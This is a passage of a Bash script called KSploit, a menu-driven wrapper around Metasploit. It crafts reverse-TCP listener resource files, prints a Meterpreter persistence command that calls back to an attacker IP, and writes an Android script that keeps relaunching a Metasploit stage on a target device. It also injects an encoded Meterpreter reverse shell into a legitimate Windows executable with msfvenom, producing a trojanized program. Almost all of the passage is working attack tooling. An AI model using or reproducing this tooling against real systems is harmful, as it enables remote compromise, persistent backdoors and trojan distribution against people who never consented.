            cat $wdir/meterpreter_mac.rc | xterm -e msfconsole -r $wdir/meterpreter_mac.rc 
	    sleep 2
            goto listen;
            ;;
        4)
            echo
            touch $wdir/meterpreter_droid.rc
            echo "         ${FGC}     Crafting a Bash Reverse TCP Listener :     ${NC}${YELLOW}"
            echo use exploit/multi/handler > $wdir/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> $wdir/meterpreter_droid.rc
	    read -p '	    Set Attacker IP* ' attackerip
            echo set LHOST $attackerip >> $wdir/meterpreter_droid.rc
            read -p '	    Set Attacker Port* ' attackerport
            echo set LPORT $attackerport >> $wdir/meterpreter_droid.rc
            echo set ExitOnSession false >> $wdir/meterpreter_droid.rc
            echo exploit -j -z >> $wdir/meterpreter_droid.rc
	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_droid.rc."
	    echo "${GREEN}            ---> Finished crafting listener."
	    sleep 1
	    echo
	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
            cat $wdir/meterpreter_droid.rc | xterm -e msfconsole -r $wdir/meterpreter_droid.rc 
	    sleep 2
            goto listen;
            ;;  
         q)
            clear
            goto $start
            ;;
         *)
           clear 
           error="$opt is not a valid option!"      	
           goto listen;
         ;;
    esac
}     
                                
################################################################################
# Migrate to Msfconsole
################################################################################
mfconsole()
{
  echo 	
  echo "${YELLOW}          --> Migrating to metasploit-framework ..."
  echo
  sudo msfdb run
  tput sgr0 
  goodbye
}	  

################################################################################
# Persistence Menu
################################################################################
persist()
{
clear
echo ${LIGHT_CYAN} 
echo "   ____               _     _                      "
echo "  |  _ \ ___ _ __ ___(_)___| |_ ___ _ __   ___ ___ "
echo "  | |_) / _ \ '__/ __| / __| __/ _ \ '_ \ / __/ _ \\${GREEN}"
echo "  |  __/  __/ |  \__ \ \__ \ ||  __/ | | | (_|  __/${LIGHT_MAGENTA}"
echo "  |_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"
echo "  ⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛"
echo ${LIGHT_MAGENTA} 
echo "  Use the persistence menu to quickly forge persistence scripts. Currently supports windows and android scripts." |fmt -w 60
echo
pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
#stay:
clear
echo ${YELLOW}
echo "	   _____________________________________________"
echo "	  |${FGG}       KSploit Persistence Menu Options:     ${NC}${YELLOW}|"
echo "	  |---------------------------------------------|"
echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Persitence Script.          ${YELLOW}|"
echo "	  |---------------------------------------------|"
echo "	  |    🤖${GREEN} 2 ${BLUE}Android Persistence Script.         ${YELLOW}|"
echo "	  |---------------------------------------------|"
echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
echo "	  |_____________________________________________${YELLOW}|${GREEN}"
echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
   echo
   echo
   locals
    case $opt in
        1)
          echo "         ${FGC}     Forging a Windows Persistence Script :     ${NC}${YELLOW}"
	  echo
	  read -p '	    Set Attacker IP* ' attackerip
    	  read -p '	    Set Attacker Port* ' attackerport
    	  read -p '	    Set Callback Interval* ' attinterval
	  echo
          echo 
          echo -e "             ${GREEN}  ⌛⌛⌛ Your Persistence Script :     ${NC}${YELLOW}"                                                    
    	  echo -e "                                                                          "  
          echo -e " ${FGC} run persistence -U -X -i $attinterval -r $attackerip -p $attackerport ${NC}${YELLOW} " | fmt -s -w 80
  	  echo 
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
          goto stay;
	;;
        2)
          echo "         ${FGC}     Forging an Android Persistence Script :     ${NC}${YELLOW}"
          touch $wdir/android.sh
          echo "#!/bin/bash" > $wdir/android.sh
          echo "while :" >> $wdir/android.sh
          echo "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> $wdir/android.sh
          echo "sleep 20" >> $wdir/android.sh
          echo "done" >> $wdir/android.sh
          sleep 2
          echo 
          echo -e "          ⌛⌛⌛ Your Persistence Script saved to $wdir/android.sh "
          echo -e "                Upload it to / on target android device${NC}" 
  	  echo 
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
          goto stay;
        ;;  
	q)
	  clear
	  goto start;
	;;
	*)
          clear 
          error="$opt is not a valid option!"      	
          goto stay;
	;;
    esac
}
################################################################################
# Windows executable payload injection
################################################################################
malexe()
{
   echo
	clear 
	errors
	echo
	echo 
	echo -e "          ${BLUE}  -------------------------------------------------------------"
	echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
	echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
	echo
	echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
	echo
	locals
	echo ${LIGHT_CYAN}
	read -p '   	       Set Attacker IP* ' attackerip
	read -p '   	       Set Attacker Port* ' attackerport
	echo -e "               💉💉💉💉💉💉💉💉💉💉💉💉💉"  
	#pick:
	echo ${LIGHT_CYAN}
        if command -v dialog > /dev/null;
	   then
		exepath=$(dialog --title "Load file" --stdout --title "Please choose a windows exe to inject" --fselect $wdir/ 14 48)
		# load file
		[ ! -z $exepath ] && pickfile "$exepath"
		#return from dialog
		echo
		clear 
		errors
		echo
		echo 
		echo -e "          ${BLUE}  -------------------------------------------------------------"
		echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
		echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
		echo
		echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
		echo
		locals
		echo ${LIGHT_CYAN}
		echo "   	       Loaded: $exepath"
	   else
	      echo -e "   	     ⚠️ ${FGC}Consider:  (sudo apt-get install dialog)  ${NC}${LIGHT_CYAN}"
	      echo	
	      read -p '   	       Path to exe for injection*' exepath
        fi

	read -p '   	       Output filename*' outputname
	echo 
	echo -e "               💉💉💉 Injecting payload into $outputname ..."
#	echo $exepath
	echo `msfvenom --platform windows -x $exepath -k -p windows/x64/meterpreter/reverse_tcp  lhost=$attackerip lport=$attackerport -b "\x00" -e x64/xor -i 39 -f exe -o $wdir/$outputname`
	if [ -f "${outputname}" ]
	then
	echo -ne '           💉\r'
	sleep .1
	echo -ne '           💉💉\r'
	sleep .1
	echo -ne '           💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	sleep .1
	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
	echo -ne "         ${FGG}${YELLOW} 💉💉💉 $wdir/$outputname saved 💉💉💉   ${NC}${LIGHT_CYAN}"'\r' 
	chmod 777 $wdir/$ouputname
	echo
	echo
	pause  '           '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	else 
	   echo "${RED}ERROR............"	
	pause  '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
	fi   
	goto start;
  exit 1; 

}

################################################################################
# INITIALIZE
################################################################################
clear

[[ `id -u` -eq 0 ]] || {
	clear 
	echo
	echo 
	echo -e "           ${FGR}${LG}💀 Must run as root (sudo ./ksploit.sh) 💀 ${NC}${RED}" 
	badbye
}

################################################################################
################################################################################
# Main program                                                                 #
################################################################################
################################################################################
function goto
{
    label=$1
    shift;
    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
    eval "$cmd"
    exit
}
function pause(){
   read -p "$*"
}
   echo
   echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
   echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
   echo "    ${RED}| ' /${LIGHT_MAGENTA}\\___ \| '_ \| |/ _ \| | __|"
   echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
   echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
   echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "${FGC}${YELLOW};
   echo -ne '   👽\r'
   sleep .1
   echo -ne '   👽👽\r'
   sleep .1
   echo -ne '   👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   sleep .1
   echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
   echo -ne '                    🕵🔎 Courtesy of KaotickJ 👽\r'${NC}
   #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
   sleep .5
   echo "${LIGHT_MAGENTA}  "
   echo
   echo "  KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits" |fmt -w 60
   echo 
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   start=${1:-"start"}
	#start:
   clear
   echo
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}           KSploit Main Menu Options:        ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    👂${GREEN} 1 ${BLUE}Listeners Menu.                     ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐚${GREEN} 2 ${BLUE}Shells menu.                        ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    💰${GREEN} 3 ${BLUE}Payloads menu.                      ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    💉${GREEN} 4 ${BLUE}Windows exe payload injection.      ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    ⌛${GREEN} 5 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    ▶️ ${GREEN} M ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit.                               ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
#   locals	
   echo ${NC}
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,M,q]    " opt
   case "$opt" in
       1) listeners
         ;;
       2) shells
         ;;
       3) payloads
         ;;
       4) malexe
         ;;
       5) persist
         ;;
       M) mfconsole
         ;;
       q)
	echo 
	echo 
	echo ${YELLOW}
	goodbye
	 ;; 
       *)clear 
         error="$opt is not a valid option!"
         goto $start
       ;;
    esac
tput sgr0 
